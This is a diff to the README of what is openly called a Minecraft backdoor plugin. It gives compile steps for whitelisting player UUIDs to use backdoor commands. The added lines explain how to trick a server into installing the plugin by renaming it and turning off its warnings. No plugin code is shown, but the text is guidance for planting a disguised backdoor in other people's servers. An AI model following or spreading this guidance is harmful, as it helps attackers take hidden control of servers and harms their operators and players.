@@ -1,6 +1,10 @@
 # Minecraft Backdoor
 
 There are probably much better backdoor templates out there, but here we are.
+
+This plugin is extremely basic, you could probably change the version in plugin.yml and have it work.
+If you are going to trick a server into using this, change the plugin name in plugin.yml, and disable the warnings in Config.java before compiling.
+
 ### Compile instructions:
 * Add desired users UUID's into Config.java to allow them to use backdoor commands.
 You can find minecraft UUID's at: [NameMC](www.namemc.com)
